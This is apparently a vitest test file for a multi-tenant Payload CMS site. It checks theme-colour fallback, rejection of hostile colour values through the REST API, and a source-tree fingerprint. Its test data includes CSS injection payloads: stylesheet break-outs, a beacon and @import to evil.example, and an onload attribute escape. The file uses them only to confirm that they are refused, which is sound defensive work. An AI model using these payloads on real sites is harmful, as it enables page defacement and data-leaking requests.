import { execFileSync } from 'node:child_process'
import { createHash } from 'node:crypto'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

import { beforeAll, describe, expect, it } from 'vitest'

import { REST_PATCH, REST_POST } from '@payloadcms/next/routes'

import configPromise from '../payload.config'
import { themeStyle } from '../lib/theme'
import { buildWorld, type Fixture } from './tenancy/fixtures'

/**
 * T017 / FR-004, SC-003 — absent, empty and malformed `theme` are three *distinct* cases,
 * and all three leave the page wearing the CITe defaults.
 *
 * ── Why three cases and not one ─────────────────────────────────────────────────────────
 *
 * They fail differently in the code. An **absent** theme never enters the optional-chain at
 * all; an **empty** one reaches it and yields `undefined`; a **malformed** one yields a
 * string that passes every truthiness check and only the regex rejects. A single "no theme"
 * case would exercise the first, pass, and say nothing about the other two — which is how a
 * validation that only tests `if (raw)` ships looking green.
 *
 * ── What "renders the CITe defaults" means without a browser (CLR-003) ──────────────────
 *
 * There is no DOM and no cascade in this stack, so this cannot be asserted by rendering. The
 * fallback is a *two-part* mechanism and both parts are checked here:
 *
 *   1. `themeStyle()` publishes **no** `--color-primary` override for a theme it cannot
 *      trust, and
 *   2. `packages/ui/src/tokens/palette.css` already declares `--color-primary` as the CITe
 *      pink, so publishing nothing *is* the default.
 *
 * Part 2 is what stops part 1 from being vacuous. `undefined` is only "the CITe defaults" for
 * as long as the stylesheet keeps that declaration — delete it and `themeStyle()` returning
 * `undefined` becomes a page with no accent colour at all, with every assertion still green.
 * FR-004's promise is "a missing theme is never a broken page", and the broken page is
 * reachable through the stylesheet, not through this function.
 */

/** The default `--color-primary` (FR-003, CLR-001). A literal here is deliberate: reading it
 *  from the stylesheet under test would make the comparison self-fulfilling. */
const CITE_DEFAULT_PRIMARY = '#EE9DC4'

const PALETTE_CSS = join(
  import.meta.dirname,
  '..',
  '..',
  '..',
  'packages',
  'ui',
  'src',
  'tokens',
  'palette.css',
)

/** An organization record as the layout hands it over — deliberately as loose as the real
 *  one, because the values this guards against arrive from the database, not from callers. */
type OrgRecord = { theme?: { primaryColor?: unknown } } | null

/** The three cases FR-004 names, each a shape the code reaches by a different path. */
const FALLBACK_CASES: ReadonlyArray<{ label: string; org: OrgRecord }> = [
  { label: 'absent — the record carries no theme at all', org: {} },
  { label: 'empty — a theme object with nothing in it', org: { theme: {} } },
  {
    label: 'malformed — a colour name, which is valid CSS but not a hex',
    org: { theme: { primaryColor: 'chartreuse' } },
  },
]

/** Further malformed shapes. Not the hostile-injection payloads (that is T014/SC-011) —
 *  these are the ordinary ways a text field arrives wrong. */
const MALFORMED_VALUES: ReadonlyArray<{ label: string; value: unknown }> = [
  { label: 'empty string', value: '' },
  { label: 'whitespace only', value: '   ' },
  { label: 'hex without the hash', value: 'EE9DC4' },
  { label: 'five digits, one short of a hex', value: '#EE9DC' },
  { label: 'digits outside hex range', value: '#GGGGGG' },
  { label: 'an rgb() function', value: 'rgb(238, 157, 196)' },
  { label: 'a number rather than a string', value: 0xee9dc4 },
  { label: 'null', value: null },
]

/** The override this function publishes for an organization, or `undefined` when it declines
 *  to publish one. Keeps every assertion below reading the same property name. */
function publishedPrimary(org: OrgRecord): unknown {
  const style = themeStyle(org) as Record<string, unknown> | undefined
  return style?.['--color-primary']
}

describe('T017 / FR-004, SC-003 — an untrusted theme falls back to the CITe defaults', () => {
  it.each(FALLBACK_CASES)('publishes no override when the theme is $label', ({ org }) => {
    expect(
      publishedPrimary(org),
      'themeStyle() published a --color-primary for a theme it cannot trust. The page then ' +
        'wears whatever that value is instead of the CITe default.',
    ).toBeUndefined()
  })

  it.each(MALFORMED_VALUES)('rejects a primaryColor that is $label', ({ value }) => {
    expect(
      publishedPrimary({ theme: { primaryColor: value } }),
      `themeStyle() let ${JSON.stringify(value)} through to --color-primary. FR-019 requires ` +
        'a malformed value to be rejected before it reaches CSS.',
    ).toBeUndefined()
  })

  it('handles a null organization the same way, rather than throwing', () => {
    expect(() => themeStyle(null)).not.toThrow()
    expect(publishedPrimary(null)).toBeUndefined()
  })

  /**
   * The control. Without it every assertion above is satisfied by `themeStyle = () => undefined`,
   * which "falls back" perfectly and co-brands nothing (FR-003, SC-002).
   */
  it('still publishes the override for a well-formed colour', () => {
    expect(publishedPrimary({ theme: { primaryColor: '#3760AA' } })).toBe('#3760AA')
  })

  /**
   * Part 2 of the mechanism: what the page actually paints when no override is published.
   * `--color-primary` must resolve to the CITe pink through the stylesheet's own default.
   */
  it('leaves --color-primary defaulted to the CITe pink in the token layer', () => {
    const css = readFileSync(PALETTE_CSS, 'utf8')

    expect(
      css,
      'palette.css no longer defaults --color-primary. With no default in the stylesheet, an ' +
        'organization with no theme renders with no accent colour — the broken page FR-004 forbids.',
    ).toMatch(/--color-primary:\s*var\(--color-rosa-raw\)\s*;/)

    expect(
      css,
      `--color-rosa-raw is no longer ${CITE_DEFAULT_PRIMARY}, so the fallback no longer lands ` +
        'on the CITe identity (FR-001, FR-003).',
    ).toMatch(new RegExp(`--color-rosa-raw:\\s*${CITE_DEFAULT_PRIMARY}\\s*;`, 'i'))
  })
})

/**
 * T014 / SC-011, FR-019, CLR-004 — a hostile `primaryColor` cannot escape its custom property.
 *
 * ── Why this is written against the REST API and not the validator ──────────────────────
 *
 * T012 already calls `theme.primaryColor`'s `validate` directly, and T013/T017 already call
 * `themeStyle()` directly. Both are unit tests of a function *in isolation*, and both stay
 * green if the checkpoint is never reached — a field whose `validate` key was dropped, an
 * access rule that lets the write past, a collection hook that rewrites `data` after
 * validation. SC-011 is not "the regex works"; it is "a value written **through the REST
 * API** is rejected and the page keeps the default". That sentence names a path, so the test
 * drives the path: the real route handler from `@payloadcms/next/routes`, a real `Request`,
 * a real token, a real database row read back afterwards.
 *
 * ── Both halves of the criterion, and why neither alone is enough ───────────────────────
 *
 *   1. **The stored value is rejected** — the write returns 4xx *and* nothing lands in the
 *      row. Status alone is not enough: a 4xx returned after a partial write still leaves a
 *      hostile colour in the database for every subsequent render, so each case reads the
 *      row back through the Local API rather than trusting the response code.
 *   2. **The rendered CSS carries the default** — `themeStyle()` over the row that actually
 *      exists publishes no `--color-primary`, which is the fallback mechanism T017 documents
 *      (publishing nothing *is* the CITe default, because `palette.css` declares it).
 *
 * The final block asserts checkpoint two over the same corpus with checkpoint one bypassed
 * entirely — the value handed straight to `themeStyle()` as though it had reached storage by
 * some other route (a migration, a seed script, a direct SQL write, a future writer nobody
 * has built yet). That is the whole point of CLR-004 being *two* checks: feature 000 measured
 * that mutating any single tenancy layer left the harness green, so a corpus that only ever
 * enters through the front door would let checkpoint two be deleted without a red test.
 *
 * The control at the end is load-bearing. Every assertion here is a refusal, and refusals are
 * satisfied perfectly by a REST endpoint that rejects *everything* — a stale token, a broken
 * route handler, a wrong collection slug. The control writes a legitimate hex down the same
 * path and requires it to land and to reach the custom property.
 */

/** Payloads with a `key` rather than an index: the key names the row this case creates, so a
 *  failure points at a slug you can query, and reordering the corpus renames nothing. */
const HOSTILE_COLOURS: ReadonlyArray<{ key: string; label: string; value: string }> = [
  {
    key: 'breakout',
    label: 'the stylesheet break-out SC-011 names verbatim',
    value: 'red;}body{display:none',
  },
  {
    key: 'breakout-spaced',
    label: 'the same break-out, spaced the way a person would type it',
    value: 'red;} body{display:none',
  },
  {
    key: 'second-declaration',
    label: 'a second declaration smuggled onto the same element',
    value: 'red; display:none',
  },
  {
    key: 'beacon',
    label: 'a valid hex that then opens a request to an attacker host',
    value: '#EE9DC4;background:url(https://evil.example/beacon)',
  },
  {
    key: 'at-import',
    label: 'an @import pulling a remote stylesheet into the page',
    value: '#fff;}@import url(https://evil.example/x.css);a{',
  },
  {
    key: 'attribute-escape',
    label: 'an attribute break-out aimed at the style attribute React emits',
    value: '#fff" onload="alert(1)',
  },
  {
    key: 'open-comment',
    label: 'an unterminated CSS comment that swallows the declarations after it',
    value: '#fff/*',
  },
  {
    key: 'var-reference',
    label: 'a var() reference, which is valid CSS and still not a colour this field may store',
    value: 'var(--color-navy)',
  },
  /**
   * The case that found a real divergence, and the reason it is not decoration.
   *
   * Checkpoint one refuses this outright — its own comment says padded input is *rejected*
   * rather than trimmed, so that nothing but a strict hex is ever stored for the readers who
   * come later. Checkpoint two was trimming before it matched, which made it accept a value
   * the first checkpoint would not, and publish the normalised hex as `--color-primary`. Two
   * checkpoints that disagree are not defence in depth: the second one is supposed to be the
   * last refusal, and a *wider* last refusal is a hole precisely on the path it exists to
   * cover — a value that reached the row without passing checkpoint one at all.
   *
   * Nothing escapes the custom property through this on its own, and that is why it survived:
   * a trimmed hex is still a hex. What it costs is the guarantee, which is the thing SC-011
   * is actually about.
   */
  {
    key: 'trailing-newline',
    label: 'a hex with a trailing newline, which checkpoint one refuses outright',
    value: '#EE9DC4\n',
  },
  {
    key: 'newline-breakout',
    label: 'a break-out hidden behind a newline',
    value: '#EE9DC4\n;}body{display:none',
  },
]

describe('T014 / SC-011 — the REST API refuses a hostile primaryColor', () => {
  let world: Fixture

  beforeAll(async () => {
    world = await buildWorld()
  }, 120_000)

  /**
   * The real route handler, driven with a real `Request` — the same technique the tenancy
   * isolation harness uses. Organizations are master-only (FR-022), so the token is not
   * optional: an unauthenticated REST call is refused before field validation is ever
   * consulted, and this suite would then assert 403-for-everyone and prove nothing.
   */
  const restWrite = async (
    method: 'POST' | 'PATCH',
    segments: string[],
    body: unknown,
  ): Promise<Response> => {
    const config = await configPromise
    const slug = ['organizations', ...segments]
    const handler = method === 'POST' ? REST_POST(config) : REST_PATCH(config)
    const request = new Request(`http://org-a.localhost/api/${slug.join('/')}`, {
      method,
      headers: new Headers({
        'Content-Type': 'application/json',
        Authorization: `JWT ${world.tokens.master}`,
      }),
      body: JSON.stringify(body),
    })
    return handler(request, { params: Promise.resolve({ slug }) })
  }

  /** The row as it actually exists, read back through the Local API rather than inferred
   *  from the response body — a 4xx that still wrote is the failure worth catching. */
  const storedOrganization = async (id: string): Promise<OrgRecord> =>
    (await world.payload.findByID({
      collection: 'organizations',
      id,
      overrideAccess: true,
    })) as OrgRecord

  it.each(HOSTILE_COLOURS)('refuses a REST create carrying $label', async ({ key, value }) => {
    const slug = `hostile-${key}`
    const response = await restWrite('POST', [], {
      name: `Hostile ${key}`,
      slug,
      status: 'active',
      theme: { primaryColor: value },
    })

    expect(
      response.status,
      `POST /api/organizations accepted ${JSON.stringify(value)} as a primaryColor. FR-019's ` +
        'first checkpoint did not reject it on the way in.',
    ).toBeGreaterThanOrEqual(400)

    const { docs } = await world.payload.find({
      collection: 'organizations',
      where: { slug: { equals: slug } },
      overrideAccess: true,
      depth: 0,
    })

    expect(
      docs,
      `the REST create was refused but an organization "${slug}" exists anyway, so ` +
        `${JSON.stringify(value)} reached storage and every later render reads it.`,
    ).toHaveLength(0)
  })

  it.each(HOSTILE_COLOURS)(
    'refuses a REST update carrying $label, and the page keeps the default',
    async ({ value }) => {
      const response = await restWrite('PATCH', [world.orgB.id], {
        theme: { primaryColor: value },
      })

      expect(
        response.status,
        `PATCH /api/organizations/:id accepted ${JSON.stringify(value)}. An organization admin ` +
          'and any API client write this same field (CLR-004).',
      ).toBeGreaterThanOrEqual(400)

      const stored = await storedOrganization(world.orgB.id)

      expect(
        stored?.theme?.primaryColor ?? undefined,
        `${JSON.stringify(value)} was persisted despite the rejected response.`,
      ).toBeUndefined()

      expect(
        publishedPrimary(stored),
        'the organization now publishes a --color-primary override, so its pages no longer ' +
          'carry the CITe default that SC-011 requires after a refused write.',
      ).toBeUndefined()
    },
  )

  /**
   * The control. Without it, an endpoint that rejects every write — a stale token, a route
   * handler wired to the wrong collection — satisfies every refusal above.
   */
  it('still accepts a well-formed hex through the very same REST path', async () => {
    const response = await restWrite('PATCH', [world.orgB.id], {
      theme: { primaryColor: '#3760AA' },
    })

    expect(
      response.status,
      'the REST path rejected a legitimate hex colour, which means the refusals above prove ' +
        'nothing about validation — they only prove the endpoint is unreachable.',
    ).toBe(200)

    const stored = await storedOrganization(world.orgB.id)
    expect(stored?.theme?.primaryColor).toBe('#3760AA')
    expect(publishedPrimary(stored)).toBe('#3760AA')
  })
})

/**
 * Checkpoint two, with checkpoint one bypassed. These values never pass through the REST API;
 * they are handed to `themeStyle()` as though they had reached the row some other way — a
 * seed script, a migration, a direct SQL write, a writer feature 002 has not built yet.
 * CLR-004 exists because one layer is worth less than it looks, and a corpus that only ever
 * enters through the front door would let this layer be deleted with the harness still green.
 */
describe('T014 / SC-011 — themeStyle() still defaults when a hostile value reached storage', () => {
  it.each(HOSTILE_COLOURS)('publishes no override for $label', ({ value }) => {
    expect(
      publishedPrimary({ theme: { primaryColor: value } }),
      `themeStyle() published ${JSON.stringify(value)} as --color-primary. React does not ` +
        'sanitise custom properties, so this value reaches the style attribute verbatim.',
    ).toBeUndefined()
  })
})

/**
 * T016 / SC-002 — one source tree, two organizations, two accents.
 *
 * ── What the criterion actually claims ──────────────────────────────────────────────────
 *
 * "Changing one organization's `primaryColor` restyles its pages with **zero source diffs**."
 * That is two claims joined by an *and*, and each is worthless alone:
 *
 *   1. **The accent follows the record.** Two organization records resolved in the *same
 *      run* must produce different accents. Same process, same module instance, same loaded
 *      `themeStyle` — so nothing about the environment can be what made them differ.
 *   2. **No source changed to make that happen.** A platform that co-brands by editing a
 *      file per tenant would satisfy claim 1 perfectly. The fingerprint is what separates
 *      "the data drove it" from "somebody edited a constant".
 *
 * ── Why a data assertion and not a render (CLR-003) ─────────────────────────────────────
 *
 * The spec's round-2 wording said "rendered", which this stack cannot do: there is no DOM
 * and no cascade here, and no visual-regression tool is joining the locked stack. So the
 * assertion is made where the per-organization value actually branches — `themeStyle()` over
 * records read back from the database — and stops there. What a browser would still have to
 * prove (that `--color-primary` reaches the painted pixel) belongs to feature 003.
 *
 * ── Why the fingerprint hashes the working tree and not the index ───────────────────────
 *
 * The question is "did the *running* source differ between the two organizations", and the
 * running source is the bytes on disk. Hashing the index (`git ls-files -s`, which carries
 * blob shas) would be steadier under a dirty tree, and blind to exactly the edit this
 * criterion forbids — an uncommitted per-tenant constant is still a source diff. Tracked-ness
 * is the right *filter*, because an untracked scratch file is nobody's deployment; content is
 * the right *subject*.
 *
 * ── Why the sensitivity test below is not decoration ────────────────────────────────────
 *
 * Every fingerprint assertion here is an equality between two values produced by the same
 * function moments apart, and `() => 'same'` satisfies all of them. Feature 000's lesson was
 * measured, not theorised: a layer nobody probed was a layer that could be deleted with the
 * harness still green. So the digest is proven to move — on content and on path — and the
 * file list is proven non-empty and to contain the files a hand-rolled co-branding would
 * have had to touch.
 */

const REPO_ROOT = join(import.meta.dirname, '..', '..', '..')

/**
 * The directories where a per-tenant edit would have to live: the theme resolver, the layout
 * that injects it, the collection that stores it, and the token layer that declares the
 * property. Deliberately not the whole repo — tests, specs and lockfiles churn for reasons
 * that have nothing to do with co-branding, and a fingerprint that moves for unrelated
 * reasons is one people learn to ignore.
 */
const SOURCE_PATHS = ['apps/web/app', 'apps/web/collections', 'apps/web/lib', 'packages/ui/src']

/** `git ls-files` on a repo this size is milliseconds; a loaded CI machine is not. */
const GIT_TIMEOUT_MS = 30_000

/** Files a hand-rolled co-branding could not avoid touching. If the fingerprint stops
 *  covering these, it is measuring the wrong tree and every equality below is vacuous. */
const MUST_BE_COVERED = ['apps/web/app/(frontend)/layout.tsx', 'packages/ui/src/tokens/palette.css']

/** Tracked paths under `SOURCE_PATHS`, sorted so the digest does not depend on git's order.
 *  `-z` because a filename may legally contain a newline. */
function trackedSourceFiles(): readonly string[] {
  const listing = execFileSync('git', ['ls-files', '-z', '--', ...SOURCE_PATHS], {
    cwd: REPO_ROOT,
    encoding: 'utf8',
    timeout: GIT_TIMEOUT_MS,
    // A large listing overruns the default pipe buffer; failing there would look like an
    // empty index, which is the vacuous pass this gate must never produce.
    maxBuffer: 32 * 1024 * 1024,
  })
  return listing
    .split('\0')
    .filter((path) => path.length > 0)
    .sort()
}

/**
 * A digest over `[path, content]` pairs. Takes the pairs rather than reading them itself so
 * the sensitivity test can feed it synthetic input — a function that only ever reads the real
 * tree cannot be shown to react to anything.
 *
 * Truncated to 16 hex characters to match the fingerprint feature 000 recorded for SC-008
 * (`3896362ba769b2ed`); 64 bits is far more than enough to notice an edit that is not trying
 * to hide.
 */
function fingerprintOf(entries: ReadonlyArray<readonly [string, string | Buffer]>): string {
  const digest = createHash('sha256')
  for (const [path, content] of entries) {
    // The separators are what stop ("ab", "c") and ("a", "bc") from colliding.
    digest.update(path)
    digest.update('\0')
    digest.update(content)
    digest.update('\0')
  }
  return digest.digest('hex').slice(0, 16)
}

/** The fingerprint of the source that is actually running this test. */
function trackedSourceFingerprint(): string {
  return fingerprintOf(
    trackedSourceFiles().map((path) => [path, readFileSync(join(REPO_ROOT, path))] as const),
  )
}

/** Names the files that moved, so a failure is a diagnosis rather than two unequal hashes. */
function changedSourceFiles(before: ReadonlyMap<string, string>): readonly string[] {
  return trackedSourceFiles().filter(
    (path) => before.get(path) !== fingerprintOf([[path, readFileSync(join(REPO_ROOT, path))]]),
  )
}

function perFileFingerprints(): ReadonlyMap<string, string> {
  return new Map(
    trackedSourceFiles().map((path) => [
      path,
      fingerprintOf([[path, readFileSync(join(REPO_ROOT, path))]]),
    ]),
  )
}

describe('T016 / SC-002 — two organizations, two accents, one unchanged source tree', () => {
  let world: Fixture

  beforeAll(async () => {
    world = await buildWorld()
  }, 120_000)

  /** The record as it exists in the database, which is the only input `themeStyle()` gets. */
  const record = async (id: string): Promise<OrgRecord> =>
    (await world.payload.findByID({
      collection: 'organizations',
      id,
      overrideAccess: true,
      depth: 0,
    })) as OrgRecord

  const setPrimaryColor = async (id: string, primaryColor: string): Promise<void> => {
    await world.payload.update({
      collection: 'organizations',
      id,
      data: { theme: { primaryColor } },
      overrideAccess: true,
    })
  }

  /**
   * The control, and the baseline for the claim below. Both organizations start with no
   * theme, so both resolve to the same thing — which means the difference asserted next was
   * produced by the colour change and by nothing that was already true.
   */
  it('starts with both organizations resolving to the same platform default', async () => {
    expect(publishedPrimary(await record(world.orgA.id))).toBeUndefined()
    expect(publishedPrimary(await record(world.orgB.id))).toBeUndefined()
  })

  it('gives one organization a new accent and leaves the other one alone', async () => {
    const before = perFileFingerprints()
    const fingerprintBefore = trackedSourceFingerprint()

    await setPrimaryColor(world.orgB.id, '#3760AA')

    const [a, b] = [await record(world.orgA.id), await record(world.orgB.id)]

    expect(
      publishedPrimary(b),
      "the organization whose primaryColor was changed did not pick up the new accent, so a " +
        'theme edit does not restyle its pages at all.',
    ).toBe('#3760AA')

    expect(
      publishedPrimary(a),
      'the untouched organization changed accent too. One tenant editing its own identity ' +
        "repainted another tenant's pages — the co-branding failure feature 000 exists to " +
        'prevent, arriving through the theme layer instead of the data layer.',
    ).toBeUndefined()

    expect(
      trackedSourceFingerprint(),
      `co-branding moved the tracked source: ${changedSourceFiles(before).join(', ') || '(none named)'}. ` +
        'SC-002 requires zero source diffs — a colour that needs an edit to take effect is a ' +
        'per-tenant constant in shared code, however it is spelled.',
    ).toBe(fingerprintBefore)
  })

  it('resolves a distinct accent for each of two records in the same run', async () => {
    const fingerprintBefore = trackedSourceFingerprint()

    // Two palette colours neither of which is the CITe default, so "they differ" cannot be
    // satisfied by one of them silently falling back.
    await setPrimaryColor(world.orgA.id, '#74B7A5')
    await setPrimaryColor(world.orgB.id, '#F8C810')

    const accents = [
      publishedPrimary(await record(world.orgA.id)),
      publishedPrimary(await record(world.orgB.id)),
    ]

    expect(accents).toEqual(['#74B7A5', '#F8C810'])
    expect(
      accents[0],
      'both organizations resolved to the same accent in one run. Same process, same module ' +
        'instance — so the value is coming from somewhere other than the record.',
    ).not.toBe(accents[1])

    expect(trackedSourceFingerprint()).toBe(fingerprintBefore)
  })

  it('publishes the same single property for both, so only the value is per-organization', async () => {
    const keysFor = async (id: string) =>
      Object.keys((themeStyle(await record(id)) ?? {}) as Record<string, unknown>)

    expect(await keysFor(world.orgA.id)).toEqual(['--color-primary'])
    expect(
      await keysFor(world.orgB.id),
      'the two organizations published different property sets. CLR-001 makes exactly one ' +
        'token per-organization; a second key here is a platform-fixed colour becoming ' +
        'per-tenant with no requirement saying so.',
    ).toEqual(['--color-primary'])
  })

  it('re-reads the record every time rather than remembering the first organization', async () => {
    const first = publishedPrimary(await record(world.orgA.id))

    // Resolve the other organization in between: a module-level cache or a memo keyed on
    // nothing would hand A's accent back for B, or B's back for A on the second read.
    expect(publishedPrimary(await record(world.orgB.id))).toBe('#F8C810')

    await setPrimaryColor(world.orgA.id, '#EE703E')

    expect(first).toBe('#74B7A5')
    expect(
      publishedPrimary(await record(world.orgA.id)),
      'the accent did not follow the record after it changed, so something between the row ' +
        'and the style object is holding the old value for the lifetime of the process.',
    ).toBe('#EE703E')
    expect(publishedPrimary(await record(world.orgB.id))).toBe('#F8C810')
  })

  describe('the fingerprint itself, which every equality above depends on', () => {
    it('covers a non-empty set of tracked source files, including the ones co-branding would touch', () => {
      const files = trackedSourceFiles()

      expect(
        files.length,
        'the fingerprint covers no files, so it is a constant and every comparison above ' +
          'passes over nothing.',
      ).toBeGreaterThan(0)

      for (const path of MUST_BE_COVERED) {
        expect(
          files,
          `${path} is not covered by the fingerprint. That is a file a hand-rolled ` +
            'co-branding would have to edit, so an edit to it would go unnoticed.',
        ).toContain(path)
      }
    })

    it('moves when content moves and when a path moves', () => {
      const base = fingerprintOf([['a.ts', 'x']])

      expect(base, 'the digest ignores content, so no source edit could ever change it.').not.toBe(
        fingerprintOf([['a.ts', 'y']]),
      )
      expect(base, 'the digest ignores paths, so a moved file would go unnoticed.').not.toBe(
        fingerprintOf([['b.ts', 'x']]),
      )
      expect(base, 'the digest ignores added files.').not.toBe(
        fingerprintOf([
          ['a.ts', 'x'],
          ['b.ts', 'y'],
        ]),
      )
      // Separator check: the pairs must not be able to collide by re-splitting the bytes.
      expect(fingerprintOf([['ab', 'c']])).not.toBe(fingerprintOf([['a', 'bc']]))
      expect(base, 'the digest is not stable, which would make it useless as a fingerprint.').toBe(
        fingerprintOf([['a.ts', 'x']]),
      )
    })
  })
})
